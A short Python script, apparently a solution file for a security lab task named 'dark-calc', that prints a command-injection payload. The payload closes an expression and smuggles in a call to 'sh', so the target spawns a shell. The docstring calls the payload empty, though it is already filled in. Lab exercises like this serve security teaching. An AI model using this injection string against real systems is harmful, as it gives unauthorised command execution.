#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"1) || sh 1>&2 || ( 1"

sys.stdout.buffer.write(payload)
